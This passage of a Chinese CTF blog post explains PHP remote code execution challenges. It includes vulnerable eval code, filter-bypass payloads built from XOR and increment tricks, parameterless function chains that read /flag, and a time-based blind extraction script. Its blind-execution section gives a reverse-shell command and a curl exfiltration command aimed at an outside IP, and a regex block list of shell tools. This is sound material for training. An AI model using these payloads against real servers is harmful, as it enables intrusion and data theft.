%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b</span><br></pre></td></tr></table></figure></div>







































第二个payload需要PHP小于7的版本，因为在PHP7，assert不再可以被动态调用

# 缓存文件RCE

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html
 学p文看p文，p神在早些年说过一个有关php缓存文件rce的trick，当我们往服务器POST上传一个文件时，php会在tmp目录下生成缓存

# RCE-Challenge-7

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$command=$_POST[&#x27;cmd&#x27;];</span><br><span class="line">if(isset($command))&#123;</span><br><span class="line">    if(!preg_match(&quot;/[A-Za-z0-9]+/i&quot;,$command)) &#123;</span><br><span class="line">        echo &quot;welcome to RCE Lession 7&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        eval($command);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;what are you doing?&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>















<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%03%01%08%00%00%06%0c%01%07&quot;^&quot;%60%60%7c%20%2f%60%60%60%60&quot;);`</span><br><span class="line"> `cmd=%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b</span><br></pre></td></tr></table></figure></div>

# RCE-Challenge-8

![image.png](https://www.nssctf.cn/files/2024/1/24/975fffe13a.png)

\5. 无参数RCE介绍

无参数RCE指的就是我们通过`xxx(xxx(xxx()));`的无参函数去获取flag，他的正则表达式为
 `/[^\W]+\((?R)?\)/`，在这里表示递归匹配。

# 利用函数

## getenv

获取环境变量
 ![image.png](https://www.nssctf.cn/files/2024/1/25/8e02bcb0fe.png)

## var_dump

打印结果，调试。

## scandir

## readfile

读取文件
 ![image.png](https://www.nssctf.cn/files/2024/1/25/e8e8a966f8.png)

## next

把数组指针往下移动一位。

## get_defined_vars

获取定义的所有变量
 `cmd=var_dump(next(get_defined_vars()));&a=1`
 ![image.png](https://www.nssctf.cn/files/2024/1/25/7186fc9d56.png)

## session_start

启动一个session

## getallheaders

获取所有的请求头

## getcwd

获取所在目录
 ![image.png](https://www.nssctf.cn/files/2024/1/25/63a0131458.png)

## apache_request_headers

只适用于apache获取请求头。

# RCE-Challenge-9

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$command=$_POST[&#x27;cmd&#x27;];</span><br><span class="line">if(isset($command))&#123;</span><br><span class="line">    if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $command)) &#123;</span><br><span class="line">        echo &quot;welcome to RCE Lession 9&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        eval($command);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;what are you doing?&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>















## 方法一

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(next(next(get_defined_vars())));&amp;a=cat /flag</span><br></pre></td></tr></table></figure></div>

## 方法二

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=readfile(next(next(get_defined_vars())));&amp;a=/flag</span><br></pre></td></tr></table></figure></div>

## 方法三

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost:32775</span><br><span class="line">Content-Length: 33</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">sec-ch-ua: &quot;Not_A Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;120&quot;, &quot;Microsoft Edge&quot;;v=&quot;120&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</span><br><span class="line">Origin: http://localhost:32775</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://localhost:32775/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">cmd:cat /flag</span><br><span class="line"></span><br><span class="line">cmd=system(end(getallheaders()));</span><br></pre></td></tr></table></figure></div>

























## 方法四

通过session_start强制启动session，通过session_id获取PHPSESSID的cookie值，得到可控字符串
 `cmd=system(session_id(session_start()));`
 `PHPSESSID=cat /flag`

## 方法五

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost:32775</span><br><span class="line">Content-Length: 42</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">sec-ch-ua: &quot;Not_A Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;120&quot;, &quot;Microsoft Edge&quot;;v=&quot;120&quot;</span><br><span class="line">Cookie: PHPSESSID=asdasdasda</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</span><br><span class="line">Origin: http://localhost:32775</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://localhost:32775/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">x-cmd:cat /flag</span><br><span class="line"></span><br><span class="line">cmd=system(end(apache_request_headers()));</span><br></pre></td></tr></table></figure></div>



























![image.png](https://www.nssctf.cn/files/2024/1/25/9ccb570479.png)

 \6. 无回显命令执行

# 无回显外带的方式

- 反弹shell

`bash -c "bash -i >& /dev/tcp/8.130.24.188/7775 <&1"`
 ![image.png](https://www.nssctf.cn/files/2024/2/7/5722f69631.png)

- curl、wget、dns外带

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=curl http://8.130.24.188:7775?a=`cat /flag`</span><br></pre></td></tr></table></figure></div>

![image.png](https://www.nssctf.cn/files/2024/2/7/e9ec65c3f2.png)

- 把flag复制到网站根目录

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /flag /var/www/html/1.txt</span><br></pre></td></tr></table></figure></div>

- bash盲注

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if [ `cat /flag | awk NR==1 | cut -c 1` == &#x27;N&#x27; ];then sleep 2;fi</span><br></pre></td></tr></table></figure></div>

# RCE-Challenge-10

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">url = &quot;http://127.0.0.1:32776/&quot;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(1,15):</span><br><span class="line">    for j in range(1,50):</span><br><span class="line">        #ascii码表</span><br><span class="line">        for k in range(32,127):</span><br><span class="line">            k=chr(k)</span><br><span class="line">            payload =f&quot;if [ `cat /flag | awk NR==&#123;i&#125; | cut -c &#123;j&#125;` == &#x27;&#123;k&#125;&#x27; ];then sleep 2;fi&quot;</span><br><span class="line">            length=len(payload)</span><br><span class="line">            data =&#123;</span><br><span class="line">                &quot;cmd&quot;: payload</span><br><span class="line">            &#125;</span><br><span class="line">            t1=time.time()</span><br><span class="line">            r=requests.post(url=url,data=data)</span><br><span class="line">            t2=time.time()</span><br><span class="line">            if t2-t1 &gt;1.5:</span><br><span class="line">                result+=k</span><br><span class="line">                print(result)</span><br><span class="line">    result += &quot; &quot;</span><br></pre></td></tr></table></figure></div>























<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$command=$_POST[&#x27;cmd&#x27;];</span><br><span class="line">if(isset($command))&#123;</span><br><span class="line">    if(!preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $command))&#123;</span><br><span class="line">        exec($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;what are you doing?&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>












    </div>
  </article>
  <div class="ccbyncsa">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="copyright">
                    <div class="author">
                        <p>作者</p>
                        <p>Bae</p>
                    </div>
                    <div class="title">
                        <p>标题</p>
                        <p>CTF中的RCE</p>
                    </div>
                        <div class="publish">
                            <p>发布于</p>
                            <p>2024-10-31</p>
                        </div>
                    <div class="ccbyncsa-icon">
                        <p>授权协议</p>
                        <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
                        <p class="ccbyncsa-icon-imgs" style="display: flex;">
                        <img src="/images/cc.svg" alt="cc">
                        <img src="/images/by.svg" alt="by">
                        <img src="/images/nc.svg" alt="nc">
                        <img src="/images/sa.svg" alt="sa">
                        </p>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
  <nav class="post-pagination">
    
      <div class="post-prev">
        <span class="nav-label">上一篇</span>
        <a href="/2024/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">CTF中的RCE</a>
      </div>
    
    
      <div class="post-next">
        <span class="nav-label">下一篇</span>
        <a href="/2024/10/23/hello-world/">Hello World</a>
      </div>
    
  </nav>
  

</div>

<script src="/js/copy.js"></script>

<aside class="sidebar-container sidebar-right">
    <div class="sidebar-bg">
        <p id="date"></p>
<script>
  function updateDate() {
    var now = new Date();
    var dateString = now.toISOString().slice(0, 10);
    document.getElementById('date').textContent = dateString;
  }

  window.addEventListener('load', function() {
    updateDate();
    // 更新频率为每5分钟更新一次，减少不必要的更新
    setInterval(updateDate, 300000);
  });
</script>
        
    <script>
      let currentTime = new Date();
      let hours = currentTime.getHours();
      let minutes = currentTime.getMinutes();
      let seconds = currentTime.getSeconds();

      function formatTime(unit) {
        return unit < 10 ? '0' + unit : unit;
      }

      function updateClock() {
        const now = new Date();
        if (now.getSeconds() !== seconds) {
          seconds = now.getSeconds();
          seconds = formatTime(seconds);
          document.getElementById('clock').textContent = `${hours}:${minutes}:${seconds}`;
        }
        if (now.getMinutes() !== minutes) {
          minutes = now.getMinutes();
          minutes = formatTime(minutes);
          document.getElementById('clock').textContent = `${hours}:${minutes}:${seconds}`;
        }
        if (now.getHours() !== hours) {
          hours = now.getHours();
          hours = hours < 10 ? '0' + hours : hours;
          document.getElementById('clock').textContent = `${hours}:${minutes}:${seconds}`;
        }

        requestAnimationFrame(updateClock);
      }

      window.onload = updateClock;
    </script>
    <p id="clock" role="timer" aria-live="polite"></p>
  
    </div>
    <div class="sidebar-bg">
        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text"> 系统命令执行函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text"> 代码执行函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text"> rce 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%B3%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text"> 即正则匹配绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#image-20241031205501710"><span class="toc-number"></span> <span class="toc-text"> </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text"> 关键字绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text"> 空格绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BD%AC%E4%B9%89%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text"> 转义绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text"> 特殊变量绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text"> Base64 编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E6%B3%95"><span class="toc-number"></span> <span class="toc-text"> 拼接法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text"> 读取文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E3%83%8E%CF%89%E3%83%8E"><span class="toc-number"></span> <span class="toc-text"> 字符串长度限制 (ﾉ*･ω･)ﾉ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#path-%E3%83%8E%CF%89%E3%83%8E"><span class="toc-number"></span> <span class="toc-text"> $PATH (ﾉ*･ω･)ﾉ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text"> 取反绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text"> 异或绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text"> 自增绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text"> 黑名单绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text"> 回溯绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BErce"><span class="toc-number">6.</span> <span class="toc-text"> 无回显 RCE</span></a></li></ol>
    </div>
    <div class="sidebar-bg">
        <div class="card-tags">
            
        </div>
    </div>
    <div>
        <div class="categories-list">
            
        </div>
    </div>
</aside>

    <!-- No categories available -->


    <footer>
    <span id="busuanzi_container_site_pv" style="display: inline;"></span>
    <span>👁<span id="busuanzi_value_site_pv"></span></span>
    <div class="padding border border-sub border-dotted fadein-right">
        <span style="color:aliceblue">👤<span id="busuanzi_value_site_uv"></span></span>
    </div>
    <span>
        由 <a target="_blank" rel="noopener" href="https://hexo.io" alt="Hexo">
            <p class="hover-underline night" style="display: inline;">Hexo</p>
        </a> 驱动
        <p style="display: inline; color: red;">❤</p>
        <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang" alt="Wang">
            <p class="hover-underline night" style="display: inline;">Wang</p>
        </a> 主题构建
    </span>
    
    <!-- 带图片的链接 -->
    <div class="footer-links">
        
            
                <a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener">
                    <img src="https://www.travellings.cn/assets/logo.gif" alt="开往-友链接力" title="开往-友链接力">
                </a>
            
                <a href="https://www.aliyun.com/minisite/goods?userCode=lmvvqvl9" target="_blank" rel="noopener">
                    <img src="https://i.ibb.co/h7XJkfm/LOGO.png" alt="阿里云支持" title="阿里云支持">
                </a>
            
                <a href="https://www.dalao.net/" target="_blank" rel="noopener">
                    <img src="https://www.dalao.net/img/dalao-svg.svg" alt="大佬论坛" title="大佬论坛">
                </a>
            
                <a href="https://bf.zzxworld.com/" target="_blank" rel="noopener">
                    <img src="https://bf.zzxworld.com/images/logo-v2.png" alt="BlogFinder" title="BlogFinder">
                </a>
            
                <a href="https://www.blogsclub.org/go" target="_blank" rel="noopener">
                    <img src="https://www.blogsclub.org/images/shuttle_4.png" alt="空间穿梭-随机访问BlogsClub成员博客" title="空间穿梭-随机访问BlogsClub成员博客">
                </a>
            
        
    </div>

    <!-- 纯文本链接 -->
    <div class="footer-text-links">
        
            
                <a href="" target="_blank" rel="noopener">
                    文字链接
                </a>
            
        
    </div>
</footer>
    
<script src="/js/background.js"></script>
    
        
<script src="/js/search.js"></script>
    
</main>
</body>
</html>
